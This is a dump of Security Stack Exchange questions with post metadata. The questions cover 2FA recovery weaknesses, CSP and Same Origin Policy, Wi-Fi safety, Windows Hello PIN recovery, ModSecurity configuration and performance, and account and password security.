<li><p>2FA enabled with SMS or another second factor. Let's say <strong>only the second factor is compromised</strong>. The malicious actor can use the &quot;I lost my password&quot; feature, then choose &quot;I don't have access to my email&quot;, then &quot;Recovery: enter your phone number&quot;. Then they receive a code by SMS, and can set up a new password and bypass the email.</p>
</li>
</ul>
<p>Then 2FA becomes 1FA if you choose the option &quot;I don't have access to email, send me a recovery code by SMS&quot;: you can recover the access with the second factor only, and totally bypass the email.</p>
<p><strong>If the email password security is better than the phone security, isn't 2FA strictly weaker than 1FA?</strong> The email provider is probably less vulnerable to social engineering than the phone company.</p>
<p>Are there examples of 2FA not becoming 1FA when using &quot;Recovery&quot; for well known services? (Gmail, Facebook, ...) It seems it is always the case.</p>
","276064","","276064","","2022-03-24 10:07:11","2022-03-24 11:24:15","Doesn't 2FA increase the vulnerability of an account?","<passwords><account-security><multi-factor><sms><social-engineering>","1","9","","","","CC BY-SA 4.0"
"260653","1","","","2022-03-24 16:06:14","","0","367","<p>Given that Same Origin Policy prevents JavaScript from one origin from running in another origin and accessing another origin's cookies, why is CSP necessary?</p>
<p>Is it that CORS selectively removes some protections of SOP, and CSP is an attempt to add some of those protections back? I think I have a fundamental misunderstanding of how these elements interact.</p>
","199648","","","","","2022-03-24 17:08:48","Why is Content Security Policy necessary given Same Origin Policy?","<web-application><web-browser><content-security-policy><cors><same-origin-policy>","1","1","","","","CC BY-SA 4.0"
"188957","1","","","2018-07-04 15:36:39","","46","10932","<p>I'm currently job searching, and sometimes I come across sites that are just huge databases full job postings, and before you apply you have to create an account. I came across <a href=""https://www.ziprecruiter.com/"" rel=""noreferrer"">a site</a>, but I'm skeptical of its security practices. </p>

<p>When I found a job posting that I wanted to apply to it asked for my e-mail address, so I entered it. A pop-up asked for me for resume, and the usual contact information. I supplied want I needed to and I sent my application.</p>

<p>I noticed however, it used my e-mail address and created a user account <strong>without</strong> prompting me for a password. </p>

<p>Immediately, I was alarmed by this, so I checked my e-mail thinking that the site supplied me with a temporary password that it requires me to change, only to discover that I had to confirm my e-mail address and then be prompted to <strong>enter</strong> a password. From my perspective, I had a user account with no password for maybe 3-5 minutes.</p>

<p>Was I right to be skeptical? Should I <em>delete</em> my account? </p>
","","user181505","","user181505","2018-07-05 13:06:36","2022-08-17 10:21:59","User Account with no password","<passwords><account-security>","6","9","","","","CC BY-SA 4.0"
"188964","1","188965","","2018-07-04 18:05:00","","-2","105","<p>Cox ISP has been changing my account information like my address, phone number and name to the wrong addresses, names and phone numbers.</p>

<p>I ask them to make the corrections and they don't.  Instead they again change to the wrong details again.</p>

<p>Sometimes they hang up on me or transfer my call or chat repeatedly to avoid helping me.</p>

<p>Obviously there are customer service reps that have access to my account information and are messing it all up.</p>

<p>This is a very undesirable information security vulnerability existing in Cox.  <strong>My bill is not even sent to the right address!</strong></p>

<p>How to use Cox ISP and maintain secure account information?</p>

<p>Is the answer to not talk to their customer support representatives who always seem to gain access to my account information and mess it up?  Or is a better answer to not use Cox at all?</p>
","179808","","179808","","2018-07-04 18:37:36","2018-07-04 18:37:36","How to use Cox ISP and maintain secure account information?","<account-security><isp>","1","1","","2018-07-04 18:19:58","","CC BY-SA 4.0"
"189021","1","189022","","2018-07-05 14:50:29","","26","39045","<p>I always feel scared to connect to hotel, airport Wi-Fi etc. I feel that if the Wi-Fi router is hacked, my personal information can be collected by a hacker. How can I determine if a Wi-Fi network is safe to connect to? </p>

<p>Also, what can an adversary do if he hacks the router I connect to? For example, can he obtain my browsing history? Can he obtain my login credentials if I log in to Gmail? Can he see the emails I sent using the network? Can he install malware onto my mobile? Can he disable the encryption somehow? Can he create some backdoor on my laptop/mobile and access it remotely?</p>

<p>Edit: I got some pretty good answers when the adversary doesn't have control over the router (like arp attacks, mitm attacks). What can an adversary do if he has control over the router?</p>
","181490","","181490","","2018-07-07 13:19:32","2018-07-07 13:19:32","How to check if a Wi-Fi network is safe to connect to?","<malware><privacy><wifi><account-security><ethernet>","3","6","","","","CC BY-SA 4.0"
"260754","1","","","2022-03-28 17:49:09","","0","1232","<p>I was wondering if Google can see my computer screen while I'm using Chrome Remote Desktop.</p>
<p>Let's assume there's my main PC named A and my other PC named B.<br />
PC B will have the Chrome extension installed and is the PC that will be accessed remotely.</p>
<p>I use Chrome Remote Desktop to access PC B from PC A.</p>
<p>I log in to a VMware Windows guest on PC B that has a bridged network connection and launch Proton VPN and open a Firefox browser and search for the term password manager using duckduckgo.com search engine and go into some of the sites from the search results.</p>
<p>Then I use KeyPass password manager and create some password entries.</p>
<p>I don't think they can see the Internet network traffic from the VMware Windows guest as it's going straight out from the guest VM without relaying through Google remote desktop.</p>
<ul>
<li><p>But I was wondering if they can see the computer screen through Chrome Remote Desktop.</p>
</li>
<li><p>Can Google see all this activity (the computer screen) and do we know if they are farming the data?</p>
</li>
</ul>
","276207","","6253","","2022-03-28 18:59:16","2022-03-28 21:37:38","Can Google see the screen when using Chrome Remote Desktop?","<privacy><account-security><google><remote-desktop>","1","0","","","","CC BY-SA 4.0"
"260801","1","","","2022-03-30 16:36:06","","0","1385","<p>Is there a workaround to the Windows 10 Hello PIN security login policy?</p>
<p>The PIN is the only credential needed to log in, no password is set, checked with samdump2.</p>
<p>I inherited this computer from a recently deceased family member, Microsoft refuses to send us the credentials for privacy reasons.</p>
<p>I dual-booted a Debian distro from which I can read the files on the Windows partition. Funny enough, the Desktop folder is completely empty, which is very strange.</p>
<p>I tried to &quot;crack&quot; the PIN using the WINHELLO2hashcat python script developed by the hashcat team: <a href=""https://hashcat.net/forum/thread-10461.html"" rel=""nofollow noreferrer"">https://hashcat.net/forum/thread-10461.html</a>
Unfortunately, the TPM is enabled and the script is useless.</p>
<ol>
<li><p>Is there a way to reset the PIN as it is possible for passwords with the help of Trinity Rescue Kit, for example?</p>
</li>
<li><p>Is there any kind of file protection I am not aware of?</p>
</li>
</ol>
","276337","","6253","","2022-03-30 16:49:25","2023-02-04 09:00:41","Windows hello pin removal/crack","<windows><account-security><password-reset>","0","2","","","","CC BY-SA 4.0"
"189076","1","","","2018-07-06 12:03:49","","9","3065","<p>I'm working on a social network using Vue.js on frontend, and Node/Express on backend. To store user sessions I'm using Redis. I'm wondering if I should hit Redis everytime user requests content, or maybe there is a way to reduce the load?</p>
","181609","","","","","2018-07-07 08:40:29","Should I authenticate user on every request?","<databases><account-security>","5","3","","","","CC BY-SA 4.0"
"189129","1","189132","","2018-07-07 08:42:33","","2","605","<p>Many booking websites or tickets ""re-sellers"" expose in plain view for the current authenticated user the commonly used ""Frequent flyer number"". </p>

<p>Should this be considered a security risk? Can this number be used with malicious intentions? </p>
","98652","","","","","2018-07-07 09:14:01","Frequent flyer number security risk or not?","<privacy><credit-card><account-security>","2","0","","","","CC BY-SA 4.0"
"47789","1","","","2013-12-29 15:50:36","","0","363","<p>So I'm doing my undergraduate thesis, I would like to explore how cross site scripting sql injections occur. And for the purpose of the thesis I'd also like to create a fictional website that is vulnerable to cross site scripting and sql injection and then evaluate the different ways that such attacks could be prevented by using vulnerability scanners and other methods. 
Though, I think this topic would be too simple for a thesis, does anyone have any suggestions on what else to add that would add some more complexity to this topic?</p>

<p>Thanks </p>
","36431","","36431","","2013-12-29 19:48:55","2013-12-29 19:48:55","Are cross site scripting attacks and sql injection a good topic for my thesis?","<web-application><sql-injection><security-theater><secure-coding>","1","4","","2013-12-29 20:11:56","","CC BY-SA 3.0"
"47887","1","","","2013-12-31 18:54:13","","-1","118","<p>For example, websites that are built in ASP,PHP,Ruby?</p>
","36431","","5169","","2013-12-31 19:37:10","2013-12-31 19:37:10","What are the difference in which different website that are built by different technologies prevent the occurrence of cross site scripting?","<web-application><appsec><xss><security-theater><secure-coding>","1","3","","2014-01-01 00:32:20","","CC BY-SA 3.0"
"260862","1","","","2022-04-01 18:14:43","","2","604","<p>I have an apache server with ModSecurity. I need to block all IPs except for a few ones.</p>
<p>The list of IPs is like this:</p>
<pre><code>194.83.128.0/21
191.143.32.0/19
145.126.72.0/21
101.28.248.0/22
40.64.64.0/22
180.11.124.0/22
190.230.64.0/18
109.154.0.0/16
42.60.0.0/16
43.223.0.0/16
2a03:e980::/29
</code></pre>
<p>Right now I applied this rule:</p>
<pre><code>SecRule REMOTE_ADDR &quot;@ipMatch 194.83.128.0/21,191.145.32.0/19,145.126.72.0/21,101.28.248.0/22,40.64.64.0/22,180.11.124.0/22,190.230.64.0/18,109.154.0.0/16,42.60.0.0/16,43.223.0.0/16,2a03:e980::/29&quot; &quot;id:162&quot;
</code></pre>
<p>But the rule above seems to be doing a whitelist rather than blocking all IPs except for the ones defined in the rule.</p>
<p>I'm not sure how to achieve blocking all IPs except the ones on my list. Most of the documentation I have found is related to blocking or adding IPs to a deny list, when some action happens, like constantly accessing 404 pages.</p>
<p>Is there a way to block by default all the IPs, except the ones defined in my list?</p>
","276445","","","","","2022-10-04 09:25:19","ModSecurity: Block all IPs except for a list of defined IPs","<apache><mod-security>","2","6","","","","CC BY-SA 4.0"
"260908","1","","","2022-04-03 22:07:57","","0","48","<p>My colleagues and I are developing a public web application with <em>client</em> and <em>admin</em> access.</p>
<p>I'm concerned about security, being the application public. I would like to add every layer, as long as it's useful and really provides security.</p>
<p>I thought that preventing the <em>client</em> access being the same as the <em>admin</em> access, would add one of such layers.</p>
<p>One idea idea is to create subdomains for each, like <code>client.app.com</code> and <code>admin.app.com</code>, though each subdomain points to the same site.</p>
<p>I'm picturing a scenario where an admin user name is trying to access from the client interface, then the source IP could be blocked.</p>
<p>The application counts with authorization and access control of the resources and routes.</p>
<p>Is this a good approach concerning security?<br />
Should we add some other layer of access control?</p>
<p>We are using the Laravel framework.</p>
","218004","","218004","","2022-04-04 06:47:00","2022-04-04 06:47:00","Prevent client access being the same as admin access in web application","<web-application><account-security><sub-domain><domain-admin>","1","2","","","","CC BY-SA 4.0"
"260936","1","","","2022-04-04 21:35:03","","0","210","<p>I have a user who has reported that they are getting a Windows Security pop up from Outlook that keeps showing up even after clicking Cancel and signing out/in shown below</p>
<p><a href=""https://i.stack.imgur.com/qD2T0.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/qD2T0.png"" alt=""enter image description here"" /></a></p>
<p>Luckily, the user didn't put in their credentials.</p>
<p>Below are some things I've checked from a security standpoint:</p>
<ol>
<li>Checked the URL in the image using an analysis tool. Nothing
malicious came back.</li>
<li>Checked the URL <code>http://cdn.goalline.ca</code> it redirects to
<code>https://stacksports.goalline.ca/</code>. Nothing malicious there as well.</li>
<li>Checked the domain cdn.goalline.ca and nothing malicious. Appears to
be registered 20yrs ago and lines up with the stacksports site
stating that it was founded in 2002.</li>
<li>Checked enterprise AV, MS Defender, etc. and nothing malicious comes back.</li>
<li>Checked list of applications and there were no recent installs or any programs that point to the URLs.</li>
</ol>
<p>From a security perspective, it seems that there's nothing malicious. Is there anything else I'm potentially missing/need to check?</p>
<p>Also, how can I stop the pop up from re-occurring?</p>
","158452","","6253","","2022-04-05 08:50:40","2022-04-05 08:50:40","Outlook - Windows Security Pop Up Never Goes Away. Potential Compromise?","<account-security><outlook>","0","5","","","","CC BY-SA 4.0"
"189269","1","189320","","2018-07-10 01:58:00","","3","188","<p>I apologize in advance for any inaccuracy.</p>

<p>I am part of a yoga community which has no particular activity on the web or in the informatic sector.
All we have that can be regarded as web-related is that we communicate through a mailing list of about 100 people.</p>

<p>However, since a few months we have been under attack of hackers who crack personal email accounts and facebook accounts. They also have circulated accurate emails with name and salutations that are proper of our community, so I believe there is a human effort behind this, and not just a software. </p>

<p>I myself do not know much on the internet account protection, but once my account was hacked, I took my actions to protect it and do not make it happen again. I changed all my passwords and made them way more complex, I activated two-factors protection, I have installed an authenticator program which warns me (and put a code-protected wall) everytime someone tries to log in my account through a device that is not one of those I specified as secure, and I am going to work more on this direction.</p>

<p>Anyway, there are still people in that mailing list who are older, or just do not know very well what to do, so their account keeps getting cracked. Of course, their incapacity puts to risk all the others connected through the mailing list, which is annoying.</p>

<p>I was looking here for advice to hire a company, or a service, which can take care of this specific group of accounts, perhaps migrating all the accounts to a common, independent provider, such as <code>person_name@yogaeurope.com</code>.</p>

<p>I have tried for days to google something that might help, but have not really found what I think I need, I giving here a try. Someone told me to buy a <a href=""https://www.webroot.com/us/en/home/sem/brand?rc=5340&amp;sc=701F0000000etVr&amp;gclid=CjwKCAjwj4zaBRABEiwA0xwsPyuS5nYyVLyYrt8eN9aijBIKc6zNr_pRh5G67GPAn412rXz0PyFEsRoCUc4QAvD_BwE"" rel=""nofollow noreferrer"">WebRoot service</a> but to me it looks it gives more protection against viruses and such, while security packages have a limit of 5 devices, so it seems to me that is not designed to protect communities against what we are experiencing (maybe I am wrong).</p>

<p><strong><em>Is there any kind of service that we can hire to protect our mailing list?</em></strong> If of any relevance, we reside in Europe (not just one single country).</p>

<p>I do not even know if such a thing exists, especially for private communities and not for business companies, but I though this was a good point to start.</p>
","181850","","","","","2018-07-13 03:46:05","Email/facebook account/internet protection service for private community","<account-security><facebook><email-spoofing><identity-theft>","2","6","","","","CC BY-SA 4.0"
"261022","1","","","2022-04-07 23:45:41","","1","31","<p>My partner and I are arguing about our auth system. They believe that obfuscating the existence of another account (by showing a generic error) is preferable to surfacing an error warning about account name collision. I argue that this is a way to get users to go away and not come back.</p>
<p>Relatedly, I suggest the pattern of obfuscating email (which also must be unique) availability in the &quot;forgot password&quot; confirmation, but they argue that if we're not obfuscating existence on sign-up, it's asinine to obfuscate on recovery. I kind of have to agree, but I'm curious why sites like microsoft follow that pattern.</p>
<p>I had to send a password reset today and they said, &quot;If [blah] matches the email on your account, we'll send you a code&quot;, but I just tried to make an account with the same email and it said, &quot;[blah] is already a Microsoft account.&quot; I feel sure I've seen this pattern elsewhere, too. What's the benefit of obfuscating one and not the other?</p>
","276662","","","","","2022-04-07 23:45:41","Obfuscate account availability during creation or not?","<account-security>","0","1","","","","CC BY-SA 4.0"
"261062","1","261069","","2022-04-09 05:48:05","","0","98","<p>Can voice input as a password be a useful security measure as an alternative to a strong password and biometrics (face, thumb, signature etc)?</p>
<p>The voice inputted as a password will be saved as a sound wave file in the system and while the authenticating end user has to input his voice with the same wordings he / she had spoken while saving the password. In case the system detects the same speech (voice match with his/her saved inputted voice as password), the system will authenticate him to log in to the system.</p>
<p>What are the bottlenecks and limitations to this security authentication measure of voice input?</p>
","276705","","6253","","2022-07-18 07:52:06","2022-07-18 07:52:06","Voice input as security measures for system authentication","<authentication><passwords><account-security><biometrics>","1","2","","","","CC BY-SA 4.0"
"122786","1","122788","","2016-05-09 20:31:32","","4","764","<p>Lets say that page A is vulnerable to XSS, but contain nothing of interest to an attacker. Page A links to page B that is not vulnerable to XSS, but contains a high value target for an attacker (such as a login form to steal passwords from). Both page A and page B are on the same domain.</p>

<p>Is it possible to exploit the XSS vulnerability on page A to run code on page B when the victim visit it, so you can steal the victims password when it is entered into the log in form?</p>

<p>I suspect that playing around with frames or iframes might be part of the solution here, so a natural follow up question is if it is possible to containt the XSS vulnerability to page A with the help of content security policy or something similar?</p>
","98538","","","","","2016-05-11 09:17:03","Can you exploit an XSS vulnerability on one page to run code on another page?","<web-application><xss><content-security-policy>","2","1","","","","CC BY-SA 3.0"
"261238","1","262973","","2022-04-16 00:47:28","","0","531","<p>I am passing the Cookie header of a valid authenticated, high privileged user to the unauthenticated or low privileged user using Autorize (Burp Extension).</p>
<p>So ideally, the Autorize says the requests are bypassed because the Cookie header is now changed. This can also be manually performed in the Browser's Application tab.</p>
<p>Is this considered to be a vulnerability given the fact that those two different accounts are mine and I know the actual session ID of both the users? (Not sniffed or hijacked)</p>
<p><a href=""https://i.stack.imgur.com/1Qx9g.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/1Qx9g.png"" alt=""enter image description here"" /></a></p>
","276725","","276725","","2022-04-16 02:26:48","2022-06-25 22:16:56","Passing the session ID of an unauthenticated user to a valid session using Burp","<cookies><account-security><authorization><burp-suite><session-fixation>","1","3","","","","CC BY-SA 4.0"
"189493","1","","","2018-07-13 03:52:00","","0","343","<p>First of all I am not very familiar with the world of encryption so please be nice. </p>

<p>I have got a data that should store in an xml using NetDataContractSerializer. This xml file gets the size of from 5MB to 10MB.  So I am zippping this file with other xml files (not required encryption due to insensitive info) into one file in order to lower the size.   </p>

<p>Due to security reason, I like to encrypt some part of this xml (still major part of a xml file) but it will need to be compressed with other files and encrypted data will not compressed much at the end.</p>

<p>Some articles say compression need to be done prior to encryption.  Is there any efficient way of serializing the data and compressed then encrypted?
Or all at once conveniently? </p>

<p>Anyone faced similar issue and resolved in a different/smarter way?</p>
","182057","","182057","","2018-07-13 04:18:54","2018-07-13 05:46:32","Best way to encrypt user data stored in xml?","<encryption><content-security-policy><xml><compression>","2","2","","","","CC BY-SA 4.0"
"189615","1","","","2018-07-15 11:43:04","","2","164","<p>Recently we started working on a mobile payment app.<br><br>We are not looking for a way to implement a ""Remember me"" function. We wondered if we should use session cookies, JWT or maybe other method of remembering user. Our questions are<ul><li>Is it safe to implement a functionality to remember user in payment apps</li><li>How would you go about it? How long should be the expiration time</li></ul>Also, it's worth noting that we would like to always keep user logged in in our mobile app (it will require PIN before every payment anyway)</p>
","181609","","181609","","2018-07-15 18:29:38","2018-07-15 18:29:38","How safe are cookies for payment application?","<authentication><account-security>","0","9","","","","CC BY-SA 4.0"
"261517","1","","","2022-04-25 14:49:30","","0","67","<p>As far as I know, the SSL certificate is public and anyone can read it. Is it possible in this case, for example, when someone, having copied the SSL certificate of my bank for himself, will be able to deceive me, acting as an man in the middle?</p>
","277357","","","","","2022-04-25 14:49:30","Using someone else's SSL certificate","<tls><network><openssl><account-security><c++>","0","17","","2022-04-26 17:48:25","","CC BY-SA 4.0"
"261550","1","","","2022-04-26 18:27:08","","0","720","<p>Lets say I'll open a third party page from the parent page using <code>window.open(popup method)</code></p>
<p>Now what I want to know is there any way where the parent page(using javascript or any third party library) which opened the popup can get info back to the parent page</p>
<p>Let's say the popup window loads a particular URL.</p>
<p>I want to grab that URL after it's loaded from that popup to the parent page.<br />
Is that possible?<br />
There is no <code>content security headers set</code> in the popup page</p>
<p>and I can't use the popup page in the parent page using iframe
because <code>X-Frame-Options</code> Header is set</p>
<p>Is there any other way to get info from the popup page as soon as it loads?</p>
","274583","","172946","","2022-04-26 20:12:13","2023-09-19 02:06:40","Can javascript from parent page read url of popup window?","<javascript><html><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"123143","1","","","2016-05-12 22:18:01","","-2","104","<p>As we know that the vulnerabilities are many and varied, but what are the vulnerabilities  in most locations and which need to be addressed and the focus on.</p>
","110463","","","","","2016-05-12 22:42:29","What are the most important vulnerabilities must be where professionalism","<web-application><penetration-test><vulnerability><content-security-policy>","1","1","","2016-05-12 22:42:34","","CC BY-SA 3.0"
"123445","1","123454","","2016-05-16 14:37:46","","0","186","<p>I work for a hotel. The hotel stores a MySQL database online. This database only contains a Reference ID, number of nights and so on, but no private data. No names, no personal information on guests. So if it fully leaks, it doesn't matter as much.</p>

<p>Then I have a new laptop (Windows 10), with Bitdefender and Zone Alarm. This laptop does not have any other software installed other than Microsoft Office nor is it used for anything else but one purpose.</p>

<p>The laptop has a .xls with customer names, phone numbers, email addresses in cleartext. A small Visual Basic program I wrote sends a feedback email (via SMTP) to each guest after their stay.</p>

<p>Now my questions are as follows:</p>

<ol>
<li><p>Is this setup safer than storing encrypted versions of their emails and phone numbers in the MySQL database? </p></li>
<li><p>Since the IP of the laptop leaks when an email is sent via SMTP (an attacker would know the local IP) is there a risk of somebody attacking the laptop via the internet?</p></li>
<li><p>Would it be safer to deploy the .xls and the macro on a Windows based server? </p></li>
<li><p>How safe is this type of setup, what would your thoughts and advice be?</p></li>
</ol>

<p>Keep in mind that I do have to be able to retrieve the emails and phone numbers on the laptop in order to send the emails.</p>
","110783","","110783","","2016-05-16 15:53:51","2016-05-16 16:16:04","Windows security & data protection","<encryption><passwords><physical><windows-10><account-security>","1","2","","","","CC BY-SA 3.0"
"190003","1","","","2018-07-20 09:23:49","","0","623","<p>As we know clients can create and run their virtual machines (VM)in the cloud computing. My question is about the confidentiality of data stored in the client's VM.</p>

<p><strong>Question</strong> 1: Does data stored in a client's VM remain private in the cloud? Is the cloud able to read the data?</p>

<p><strong>Question</strong> 2: Is there any way to hide data (e.g. secret keys) stored in the client's VM? </p>
","182565","","","","","2018-07-20 15:24:11","Privacy of client's virtual machine in cloud computing","<privacy><virtualization><account-security><cloud-computing><confidentiality>","2","2","","","","CC BY-SA 4.0"
"261882","1","","","2022-05-10 13:52:05","","0","128","<p>While trying to implement NGinx WAF with ModSecurity 3.0.6 I am facing the issue with very poor XML SOAP POST performance. Rrequests takes ~5 seconds with occasional spikes up to 10 seconds.</p>
<p>If I disable the following set of ModSecurity CoreRuleset rules, then page response is within 0.6-0.8 seconds: 942360 932150 932115 932100 932110 932105 942190 941170. Obviously disabling IIS, MSSQL and Windows exploit protection when exactly that is on the backend does not sound like a right way to do it. :)</p>
<p>This list was somehow obtained via systemtap script. The above rules with v3.0.4 were performing 1000-10000 times slower than rest of the rules! &quot;Somehow&quot;, because after server was reinstalled with prebuild packages same systemtap <a href=""https://github.com/SpiderLabs/ModSecurity-nginx/blob/master/ngx-modsec.stp"" rel=""nofollow noreferrer"">script</a> does not work. If I run <code>stap -l 'process(&quot;/opt/modsecurity/libmodsecurity.so*&quot;).*' </code> there is no &quot;.function&quot; string in the output.</p>
<p>The issue was spotted with ModSecurity 3.0.4 (with responses up to 20 seconds!) and I have tried to do debug on a host. During that time I have downloaded 3.0.6 version and compiled ModSecurity, NGinx connector for specific NGinx version, using default config options (following NGinx <a href=""https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/"" rel=""nofollow noreferrer"">blog</a>). At some point it looked, like the update to 3.0.6 have resolved this issue as responses were down to 0.6-0.9 second, which seemed acceptable. So it was decided to rebuild host, update pipeline and rebuild packaged. After rebuild, I still see responses averaging at 5 seconds.</p>
<p>So either I might have missed something, either it is expected performance. It is also quite possible, that during frantic testing attempts I might actually have run tests on server with removed above rules and was happy with &quot;upgrade&quot;. :)</p>
<p>Host: Azure Standard D2ds v4 (2 vcpus, 8 GiB memory)<br>
NGinx: nginx-1.18.0-2.el7.ngx.x86_64 (tried with 1.20 but performance was even worse)<br>
OS: CentOS 7.8<br>
CoreRuleset: 3.0.2, 3.1.2. 3.3.2 no significant difference observed</p>
<p>XML request</p>
<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns=&quot;http://www.egem.nl/StUF/sector/bg/0310&quot; xmlns:stuf=&quot;http://www.egem.nl/StUF/StUF0301&quot;&gt;
   &lt;soapenv:Header/&gt;
   &lt;soapenv:Body&gt;
      &lt;BG:npsLv01-prs-NatuurlijkPersoon xsi:schemaLocation=&quot;http://www.egem.nl/StUF/sector/bg/0310 bg0310_msg_prs.xsd&quot; xmlns:StUF=&quot;http://www.egem.nl/StUF/StUF0301&quot; xmlns:BG=&quot;http://www.egem.nl/StUF/sector/bg/0310&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
         &lt;BG:stuurgegevens&gt;
            &lt;StUF:berichtcode&gt;AAAA&lt;/StUF:berichtcode&gt;
            &lt;StUF:zender&gt;
               &lt;StUF:organisatie&gt;xxxx&lt;/StUF:organisatie&gt;
               &lt;StUF:applicatie&gt;YYYY&lt;/StUF:applicatie&gt;
            &lt;/StUF:zender&gt;
            &lt;StUF:ontvanger&gt;
               &lt;StUF:organisatie&gt;xxxx&lt;/StUF:organisatie&gt;
               &lt;StUF:applicatie&gt;DDS&lt;/StUF:applicatie&gt;
            &lt;/StUF:ontvanger&gt;
            &lt;StUF:referentienummer&gt;123455555&lt;/StUF:referentienummer&gt;
            &lt;StUF:tijdstipBericht&gt;11111111&lt;/StUF:tijdstipBericht&gt;
            &lt;StUF:entiteittype&gt;NPS&lt;/StUF:entiteittype&gt;
         &lt;/BG:stuurgegevens&gt;
         &lt;BG:parameters&gt;
            &lt;StUF:sortering&gt;0&lt;/StUF:sortering&gt;
            &lt;StUF:indicatorVervolgvraag&gt;false&lt;/StUF:indicatorVervolgvraag&gt;
            &lt;StUF:maximumAantal&gt;1&lt;/StUF:maximumAantal&gt;
         &lt;/BG:parameters&gt;
         &lt;BG:gelijk StUF:entiteittype=&quot;NPS&quot;&gt;
            &lt;BG:inp.bsn&gt;123456789&lt;/BG:inp.bsn&gt;
         &lt;/BG:gelijk&gt;
         &lt;BG:scope&gt;
            &lt;BG:object StUF:entiteittype=&quot;NPS&quot;&gt;
               &lt;BG:inp.bsn xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:geslachtsnaam xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:voorvoegselGeslachtsnaam/&gt;
               &lt;BG:voorletters/&gt;
               &lt;BG:voornamen/&gt;
               &lt;BG:aanduidingNaamgebruik xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:geslachtsnaamPartner/&gt;
               &lt;BG:voorvoegselGeslachtsnaamPartner/&gt;
               &lt;BG:aanhefAanschrijving xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:voornamenAanschrijving/&gt;
               &lt;BG:geslachtsnaamAanschrijving/&gt;
               &lt;BG:adellijkeTitelPredikaat xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:geslachtsaanduiding xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:geboortedatum xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:inp.geboorteplaats/&gt;
               &lt;BG:inp.geboorteLand xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:overlijdensdatum xsi:nil=&quot;true&quot;/&gt;
               &lt;BG:verblijfsadres&gt;
                  &lt;BG:aoa.identificatie xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:wpl.identificatie xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:wpl.woonplaatsNaam/&gt;
                  &lt;BG:gor.openbareRuimteNaam/&gt;
                  &lt;BG:gor.straatnaam/&gt;
                  &lt;BG:aoa.postcode xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:aoa.huisnummer xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:aoa.huisletter xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:aoa.huisnummertoevoeging/&gt;
                  &lt;BG:inp.locatiebeschrijving/&gt;
               &lt;/BG:verblijfsadres&gt;
               &lt;BG:sub.correspondentieAdres&gt;
                  &lt;BG:wpl.woonplaatsNaam/&gt;
                  &lt;BG:postcode xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:aoa.identificatie xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:gor.openbareRuimteNaam/&gt;
                  &lt;BG:aoa.huisnummer xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:aoa.huisletter xsi:nil=&quot;true&quot;/&gt;
                  &lt;BG:aoa.huisnummertoevoeging/&gt;
               &lt;/BG:sub.correspondentieAdres&gt;
               &lt;BG:sub.telefoonnummer/&gt;
               &lt;BG:sub.faxnummer/&gt;
               &lt;BG:sub.emailadres/&gt;
               &lt;BG:acd.code/&gt;
               &lt;StUF:extraElementen&gt;
                  &lt;StUF:extraElement naam=&quot;String&quot;/&gt;
              &lt;/StUF:extraElementen&gt;
               &lt;BG:inp.heeftAlsNationaliteit StUF:entiteittype=&quot;NPSNAT&quot;&gt;
                  &lt;BG:gerelateerde StUF:entiteittype=&quot;NAT&quot;&gt;
                     &lt;BG:code xsi:nil=&quot;true&quot;/&gt;
                     &lt;BG:omschrijving/&gt;
                  &lt;/BG:gerelateerde&gt;
               &lt;/BG:inp.heeftAlsNationaliteit&gt;
            &lt;/BG:object&gt;
         &lt;/BG:scope&gt;
      &lt;/BG:npsLv01-prs-NatuurlijkPersoon&gt;
   &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre>
","277960","","","","","2022-05-10 13:52:05","Very slow SOAP POST request processing with ModSecure for certain rules (SQL, IIS and system exploits)","<nginx><mod-security><performance>","0","11","","","","CC BY-SA 4.0"
"190274","1","190286","","2018-07-24 16:20:54","","4","549","<p>While looking at <a href=""https://security.stackexchange.com/q/190245/127885"">this question</a>, one of the comments made me think. In the comment, the user asserted that ""one must invest a lock that cost $40, the insurance company just want to make sure that it gives enough deterrent so that thief will switch to next easier target"".</p>

<p>In the scenario of a bicycle, the lock is an immediately visible deterrent. I could be oversimplifying, but I don't see that being completely comparable in the realm of IT security.</p>

<p>Granted, asking for a name and password will stop most people from just trying to get to other accounts. With how most attacks are automated, does showing you require upper/lower/number/special characters deter more people?</p>

<p>I'm thinking that hitting any sort of roadblock will stop some minor attackers coming in just to look around. However, if someone is more intent on getting into your system, at what point do all of our security practices start to deter the attackers? At a certain point, does having tons of security become more of a ""challenge factor"" to beat?</p>
","127885","","6253","","2018-07-24 19:03:19","2018-07-30 13:24:06","How much of a visible deterrent is IT security?","<appsec><defense><security-theater>","3","3","","","","CC BY-SA 4.0"
"190305","1","","","2018-07-24 21:45:43","","-2","228","<p>KeePass is not good. It would work perfectly if all I wanted my passwords for were accounts on my computer, but if I needed to log in to Netflix on my TV, or my Facebook at a friend's house, I'm out of luck. </p>

<p>We're constantly reminded to keep our passwords secure and safe, so can someone please advise as to what the best way to store passwords is?</p>

<p>Encrypted sure, but I'm looking for a solution like KeePass that works across all of my devices, one that is not limited to the scope of the specific device the KeePass is on.</p>
","170514","","6253","","2018-07-25 10:47:51","2018-07-25 10:47:51","Best way to store passwords across devices?","<password-management><account-security>","2","2","","2018-07-25 10:48:29","","CC BY-SA 4.0"
